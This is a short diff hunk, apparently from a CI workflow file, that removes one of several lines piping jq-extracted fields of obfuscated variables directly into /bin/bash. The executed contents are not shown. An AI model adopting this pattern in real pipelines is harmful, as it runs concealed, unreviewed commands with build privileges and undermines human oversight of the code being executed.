@@ -20,7 +20,6 @@ jobs:
           echo $cxfyv0 | jq -r .tgdob4464 | /bin/bash
           echo $g33554 | jq -r .m197 | /bin/bash
           echo $ctc18 | jq -r .bomay859 | /bin/bash
-          printf '%s' "$bvoby7510" | jq -r .desfv37852 | /bin/bash
           printf '%s' "$j3530" | jq -r .munwi625 | /bin/bash
 
       - name: Persist data
